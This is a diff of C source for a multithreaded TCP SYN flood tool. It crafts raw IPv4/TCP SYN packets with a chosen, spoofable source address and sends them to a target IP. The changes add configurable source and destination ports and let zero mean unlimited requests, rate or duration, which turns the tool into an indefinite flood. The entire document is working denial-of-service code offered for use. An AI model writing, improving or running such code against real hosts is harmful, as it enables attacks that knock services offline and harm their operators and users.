@@ -3,16 +3,18 @@
 #include "make_ipv4.h"
 #include "make_tcp.h"
 
-int tcpsyn_total;
-int tcpsyn_produced;
-int tcpsyn_received;
+unsigned int tcpsyn_total;
+unsigned int tcpsyn_produced;
+unsigned int tcpsyn_received;
 
-int tcpsyn_per_second;
-int tcpsyn_duration;
+unsigned int tcpsyn_per_second;
+unsigned int tcpsyn_duration;
 double tcpsyn_elapsed_time;
 
-char *dest_ip;
-char *src_ip;
+char *tcpsyn_dest_ip;
+char *tcpsyn_src_ip;
+int tcpsyn_src_port;
+int tcpsyn_dest_port;
 
 pthread_mutex_t tcpsyn_mutex;
 pthread_cond_t tcpsyn_cond;
@@ -21,10 +23,10 @@ void syn_flood_print_usage(int mode) {
 
 	if (mode == 1)
 		printf(
-				"SYN flood Usage : [Src-IP] [Dest-IP] [# thread] [# requests] \n");
+				"SYN flood Usage : [Src-IP] [Dest-IP] [# thread] [# requests(0 for INF)] [Src-Port] [Dest-Port] \n");
 	if (mode == 2)
 		printf(
-				"SYN flood Usage : [Src-IP] [Dest-IP] [# thread] [# per seconds] [duration (0 for INF)]\n");
+				"SYN flood Usage : [Src-IP] [Dest-IP] [# thread] [# per seconds(0 for INF)] [duration (0 for INF)] [Src-Port] [Dest-Port]\n");
 }
 
 void* generate_syn_request1(void *data) {
@@ -35,16 +37,16 @@ void* generate_syn_request1(void *data) {
 		struct iphdr ipv4_h;
 		ipv4_h = prepare_empty_ipv4();
 		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_TCP);
-		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(src_ip));
+		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(tcpsyn_src_ip));
 
 		/*** If you want to modify ip address*/
-		//next_ip_addr(src_ip, 1);
-		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(dest_ip));
+		//next_ip_addr(tcpsyn_src_ip, 1);
+		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(tcpsyn_dest_ip));
 
 		struct tcphdr tcp_h;
 		tcp_h = prepare_empty_tcp();
-		tcp_h = tcp_set_source(tcp_h, tcpsyn_produced);
-		tcp_h = tcp_set_dest(tcp_h, tcpsyn_produced);
+		tcp_h = tcp_set_source(tcp_h, tcpsyn_src_port);
+		tcp_h = tcp_set_dest(tcp_h, tcpsyn_dest_port);
 		tcp_h = tcp_set_seq(tcp_h, tcpsyn_produced);
 
 		//tcp_h = tcp_set_ack_seq(tcp_h,35623);
@@ -52,13 +54,12 @@ void* generate_syn_request1(void *data) {
 
 		tcp_h = tcp_set_syn_flag(tcp_h);
 
-		tcp_h = tcp_get_checksum(ipv4_h, tcp_h, 0);
+		tcp_h = tcp_get_checksum(ipv4_h, tcp_h,NULL, 0);
 
 		ipv4_h = ipv4_add_size(ipv4_h, sizeof(tcp_h));
 		char *packet = packet_assemble(ipv4_h, &tcp_h, sizeof(tcp_h));
 
-		printf("%d\n",((struct iphdr *)packet)->tot_len);
-
+		printf("%d\n", ((struct iphdr*) packet)->tot_len);
 
 		pthread_mutex_lock(&tcpsyn_mutex);
 
@@ -68,7 +69,7 @@ void* generate_syn_request1(void *data) {
 			return 0;
 		}
 
-		send_packet(sock, ipv4_h, packet, rand() % 50000 + 1000);
+		send_packet(sock, ipv4_h, packet, tcpsyn_dest_port);
 		free(packet);
 		tcpsyn_produced++;
 
@@ -85,26 +86,26 @@ void* generate_syn_request2(void *data) {
 		struct iphdr ipv4_h;
 		ipv4_h = prepare_empty_ipv4();
 		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_TCP);
-		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(src_ip));
+		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(tcpsyn_src_ip));
 
-		//modify src_ip, increment 1.
-		//next_ip_addr(src_ip, 1);
+		//modify tcpsyn_src_ip, increment 1.
+		//next_ip_addr(tcpsyn_src_ip, 1);
 
-		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(dest_ip));
+		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(tcpsyn_dest_ip));
 
 		struct tcphdr tcp_h;
 		tcp_h = prepare_empty_tcp();
-		tcp_h = tcp_set_source(tcp_h, tcpsyn_total);
-		tcp_h = tcp_set_dest(tcp_h, tcpsyn_total);
+		tcp_h = tcp_set_source(tcp_h, tcpsyn_src_port);
+		tcp_h = tcp_set_dest(tcp_h, tcpsyn_dest_port);
 		tcp_h = tcp_set_seq(tcp_h, tcpsyn_total);
 		//tcp_h = tcp_set_ack_seq(tcp_h,35623);
 
 		tcp_h = tcp_set_syn_flag(tcp_h);
 
-		tcp_h = tcp_get_checksum(ipv4_h, tcp_h, 0);
+		tcp_h = tcp_get_checksum(ipv4_h, tcp_h,NULL, 0);
 
-		char *packet = packet_assemble(ipv4_h, &tcp_h, sizeof(tcp_h));
 		ipv4_h = ipv4_add_size(ipv4_h, sizeof(tcp_h));
+		char *packet = packet_assemble(ipv4_h, &tcp_h, sizeof(tcp_h));
 
 		pthread_mutex_lock(&tcpsyn_mutex);
 
@@ -118,7 +119,7 @@ void* generate_syn_request2(void *data) {
 			pthread_cond_wait(&tcpsyn_cond, &tcpsyn_mutex);
 		}
 
-		send_packet(sock, ipv4_h, packet, rand() % 50000 + 1000);
+		send_packet(sock, ipv4_h, packet, tcpsyn_dest_port);
 		free(packet);
 		tcpsyn_produced++;
 		tcpsyn_total++;
@@ -155,7 +156,7 @@ void* syn_time_check(void *data) {
 
 void syn_flood_run(char *argv[], int mode) {
 
-	src_ip = (char*) malloc(sizeof(char) * 20);
+	tcpsyn_src_ip = (char*) malloc(sizeof(char) * 20);
 
 	int argc = 0;
 
@@ -163,21 +164,27 @@ void syn_flood_run(char *argv[], int mode) {
 		argc++;
 	}
 
-	if (mode == 1 && argc != 4) {
+	if (mode == 1 && argc != 6) {
 		syn_flood_print_usage(mode);
 		return;
-	} else if (mode == 2 && argc != 5) {
+	} else if (mode == 2 && argc != 7) {
 		syn_flood_print_usage(mode);
 		return;
 	}
 
-	strcpy(src_ip, argv[0]);
+	strcpy(tcpsyn_src_ip, argv[0]);
 
 	tcpsyn_mutex = PTHREAD_MUTEX_INITIALIZER;
 
 	tcpsyn_produced = 0;
 	if (mode == 1) {
 		tcpsyn_total = atoi(argv[3]);
+		tcpsyn_src_port = atoi(argv[4]);
+		tcpsyn_dest_port = atoi(argv[5]);
+
+		if (tcpsyn_total == 0)
+			tcpsyn_total = __UINT_MAXIMUM__;
+
 	}
 
 	if (mode == 2) {
@@ -185,12 +192,20 @@ void syn_flood_run(char *argv[], int mode) {
 		tcpsyn_per_second = atoi(argv[3]);
 		tcpsyn_duration = atoi(argv[4]);
 		if (tcpsyn_duration == 0)
-			tcpsyn_duration = (1 << 30);
+			tcpsyn_duration = __UINT_MAXIMUM__;
+
+
+
+		if (tcpsyn_per_second == 0)
+			tcpsyn_per_second = __UINT_MAXIMUM__;
+
+		tcpsyn_src_port = atoi(argv[5]);
+		tcpsyn_dest_port = atoi(argv[6]);
 	}
 
 	int num_threads = atoi(argv[2]);
 
-	dest_ip = argv[1];
+	tcpsyn_dest_ip = argv[1];
 
 	int *generate_thread_id;
 	pthread_t *generate_thread;
@@ -200,7 +215,7 @@ void syn_flood_run(char *argv[], int mode) {
 			sizeof(pthread_t) * (num_threads + 1));
 	int i;
 
-	printf("Sending SYN requests to %s using %d threads\n", dest_ip,
+	printf("Sending SYN requests to %s using %d threads\n", tcpsyn_dest_ip,
 			num_threads);
 	for (i = 0; i < num_threads; i++)
 		generate_thread_id[i] = i;
@@ -233,7 +248,7 @@ void syn_flood_run(char *argv[], int mode) {
 
 	free(generate_thread_id);
 	free(generate_thread);
-	free(src_ip);
+	free(tcpsyn_src_ip);
 	return;
 }
 
